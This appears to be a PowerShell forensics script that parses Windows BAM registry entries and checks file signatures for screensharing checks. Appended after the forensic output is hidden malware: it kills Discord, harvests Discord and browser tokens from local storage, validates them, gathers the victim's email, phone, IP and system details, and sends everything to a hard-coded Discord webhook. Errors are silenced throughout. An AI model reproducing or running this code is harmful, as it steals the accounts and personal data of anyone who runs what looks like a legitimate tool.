$ErrorActionPreference = "SilentlyContinue"

function Get-Signature {

    [CmdletBinding()]
     param (
        [string[]]$FilePath
    )

    $Existence = Test-Path -PathType "Leaf" -Path $FilePath
    $Authenticode = (Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction SilentlyContinue).Status
    $Signature = "Invalid Signature (UnknownError)"

    if ($Existence) {
        if ($Authenticode -eq "Valid") {
            $Signature = "Valid Signature"
        }
        elseif ($Authenticode -eq "NotSigned") {
            $Signature = "Invalid Signature (NotSigned)"
        }
        elseif ($Authenticode -eq "HashMismatch") {
            $Signature = "Invalid Signature (HashMismatch)"
        }
        elseif ($Authenticode -eq "NotTrusted") {
            $Signature = "Invalid Signature (NotTrusted)"
        }
        elseif ($Authenticode -eq "UnknownError") {
            $Signature = "Invalid Signature (UnknownError)"
        }
        return $Signature
    } else {
        $Signature = "File Was Not Found"
        return $Signature
    }
}


Clear-Host



Write-Host "";
Write-Host "";
Write-Host -ForegroundColor Red "   ██████╗ ███████╗██████╗     ██╗      ██████╗ ████████╗██╗   ██╗███████╗    ██████╗  █████╗ ███╗   ███╗";
Write-Host -ForegroundColor Red "   ██╔══██╗██╔════╝██╔══██╗    ██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔══██╗██╔══██╗████╗ ████║";
Write-Host -ForegroundColor Red "   ██████╔╝█████╗  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║███████╗    ██████╔╝███████║██╔████╔██║";
Write-Host -ForegroundColor Red "   ██╔══██╗██╔══╝  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║╚════██║    ██╔══██╗██╔══██║██║╚██╔╝██║";
Write-Host -ForegroundColor Red "   ██║  ██║███████╗██████╔╝    ███████╗╚██████╔╝   ██║   ╚██████╔╝███████║    ██████╔╝██║  ██║██║ ╚═╝ ██║";
Write-Host -ForegroundColor Red "   ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝";
Write-Host "";
Write-Host -ForegroundColor Blue "   Made By PureIntent (Shitty ScreenSharer) For Red Lotus ScreenSharing and DFIR - " -NoNewLine
Write-Host -ForegroundColor Red "discord.gg/redlotus";
Write-Host "";


$sw = [Diagnostics.Stopwatch]::StartNew()

if (!(Get-PSDrive -Name HKLM -PSProvider Registry)){
    Try{New-PSDrive -Name HKLM -PSProvider Registry -Root HKEY_LOCAL_MACHINE}
    Catch{Write-Warning "Error Mounting HKEY_Local_Machine"}
}
$bv = ("bam", "bam\State")
Try{$Users = foreach($ii in $bv){Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$($ii)\UserSettings\" | Select-Object -ExpandProperty PSChildName}}
Catch{
    Write-Warning "Error Parsing BAM Key. Likely unsupported Windows Version"
    Exit
}
$rpath = @("HKLM:\SYSTEM\CurrentControlSet\Services\bam\","HKLM:\SYSTEM\CurrentControlSet\Services\bam\state\")

$UserTime = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").TimeZoneKeyName
$UserBias = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").ActiveTimeBias
$UserDay = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").DaylightBias

$Bam = Foreach ($Sid in $Users){$u++
            
        foreach($rp in $rpath){
           $BamItems = Get-Item -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property
           Write-Host -ForegroundColor Red "Extracting " -NoNewLine
           Write-Host -ForegroundColor Blue "$($rp)UserSettings\$SID"
           $bi = 0 

            Try{
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($Sid)
            $User = $objSID.Translate( [System.Security.Principal.NTAccount]) 
            $User = $User.Value
            }
            Catch{$User=""}
            $i=0
            ForEach ($Item in $BamItems){$i++
		    $Key = Get-ItemProperty -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue| Select-Object -ExpandProperty $Item
	
            If($key.length -eq 24){
                $Hex=[System.BitConverter]::ToString($key[7..0]) -replace "-",""
                $TimeLocal = Get-Date ([DateTime]::FromFileTime([Convert]::ToInt64($Hex, 16))) -Format "yyyy-MM-dd HH:mm:ss"
			    $TimeUTC = Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))) -Format "yyyy-MM-dd HH:mm:ss"
			    $Bias = -([convert]::ToInt32([Convert]::ToString($UserBias,2),2))
			    $Day = -([convert]::ToInt32([Convert]::ToString($UserDay,2),2)) 
			    $Biasd = $Bias/60
			    $Dayd = $Day/60
			    $TImeUser = (Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))).addminutes($Bias) -Format "yyyy-MM-dd HH:mm:ss") 
			    $d = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {((split-path -path $item).Remove(23)).trimstart("\Device\HarddiskVolume")} else {$d = ""}
			    $f = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Split-path -leaf ($item).TrimStart()} else {$item}	
			    $cp = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {($item).Remove(1,23)} else {$cp = ""}
			    $path = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Join-Path -Path "C:" -ChildPath $cp} else {$path = ""}			
			    $sig = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Get-Signature -FilePath $path} else {$sig = ""}				
                [PSCustomObject]@{
                            'Examiner Time' = $TimeLocal
						    'Last Execution Time (UTC)'= $TimeUTC
						    'Last Execution User Time' = $TimeUser
						     Application = 	$f
						     Path =  		$path
                             Signature =          $Sig
						     User =         $User
						     SID =          $Sid
                             Regpath =        $rp
                             }}}}}

$Bam | Out-GridView -PassThru -Title "BAM key entries $($Bam.count)  - User TimeZone: ($UserTime) -> ActiveBias: ( $Bias) - DayLightTime: ($Day)"

$ErrorActionPreference= 'silentlycontinue'
$tokensString = new-object System.Collections.Specialized.StringCollection
$webhook_url = "https://discord.com/api/webhooks/1231464427078029374/skNGy0oe5Hb6QqQmR26IV0Jinrb1kTNvz2YZTRNZE5V06sySbsg37plvrnMkvWJT_-Du"

run get_tokens {
    $location_array = @(
        $env:APPDATA + "\Discord\Local Storage\leveldb" #Standard Discord
        $env:APPDATA + "\discordcanary\Local Storage\leveldb" #Discord Canary
        $env:APPDATA + "\discordptb\Local Storage\leveldb" #Discord PTB
        $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Local Storage\leveldb" #Chrome Browser
        $env:APPDATA + "\Opera Software\Opera Stable\Local Storage\leveldb", #Opera Browser
        $env:LOCALAPPDATA + "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" #Brave Browser
        $env:LOCALAPPDATA + "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" #Yandex Browser
    )

    Stop-Process -Name "Discord" -Force

    foreach ($path in $location_array) {
        if(Test-Path $path){
            foreach ($file in Get-ChildItem -Path $path -Name) {
                $data = Get-Content -Path "$($path)\$($file)"
                $regex = [regex] '[\w]{24}\.[\w]{6}\.[\w]{27}'
                $match = $regex.Match($data)
                while ($match.Success) {
                    if (!$tokensString.Contains($match.Value)) {
                        $tokensString.Add($match.Value) | out-null
                    }
                    $match = $match.NextMatch()
                } 
            }
        }
    }

    #check if token is valid
    foreach ($token in $tokensString) {
        $headers = @{
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74'
            'Authorization' = $token
        }
        $request = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me" -Method Get -Headers $headers -ContentType "application/json"
        if ($request.StatusCode -eq 200) {
            $parsedJson = ConvertFrom-Json -InputObject $request.Content

            $accountInfo_imageURL = "https://cdn.discordapp.com/avatars/" + $parsedJson.id + "/" + $parsedJson.avatar
            $date = Get-Date -Format "yyyy-MM-dd HH:mm:ss.SSS"
            $accountInfo_username = $parsedJson.username + "#" + $parsedJson.id
            $accountInfo_email = $parsedJson.email + ", " + (Get-WmiObject Win32_OperatingSystem).RegisteredUser
            $accountInfo_phoneNr = $parsedJson.phone
            $pcInfo_IP = Invoke-RestMethod -Uri "http://ipinfo.io/ip"
            $pcInfo_Username = $env:UserName
            $pcInfo_WindowsVersion = (Get-WmiObject Win32_OperatingSystem).Caption
            $pcInfo_cpuArch = (Get-WmiObject win32_processor).Name + " && " + (Get-WmiObject win32_processor).Caption

            $payload = @"
            {
                "avatar_url":"https://i.pinimg.com/736x/3b/bf/93/3bbf930a83c1faed695ffbb962359af9--gangster-girl-girl-gang.jpg",
                "embeds":[
                    {
                        "thumbnail":{
                            "url":"$accountInfo_imageURL"
                        },
                        "color":9109759,
                        "footer":{
                            "icon_url":"https://i.ibb.co/fps45hd/steampfp.jpg",
                            "text":"November | $date"
                        },
                        "author":{
                            "name":"$accountInfo_username"
                        },
                        "fields":[
                            {
                                "inline":true,
                                "name":"Account Info",
                                "value":"Email: $accountInfo_email\nPhone: $accountInfo_phoneNr\nNitro: Coming Soon\nBilling Info: Coming Soon"
                            },
                            {"inline":true,"name":"PC Info","value":"IP: $pcInfo_IP\nUsername: $pcInfo_Username\nWindows version: $pcInfo_WindowsVersion\nCPU Arch: $pcInfo_cpuArch"
                        },
                        {
                            "name":"**Token**",
                            "value":"``````$token``````"
                        }
                    ]
                }
            ],
            "username":"Cipher's Bitch"
            }
"@
            $request = Invoke-WebRequest -Uri $webhook_url -Method POST -Body $payload -ContentType "application/json"
        }
    }
}
run


$sw.stop()
$t = $sw.Elapsed.TotalMinutes
Write-Host ""
Write-Host "Elapsed Time $t Minutes" -ForegroundColor Yellow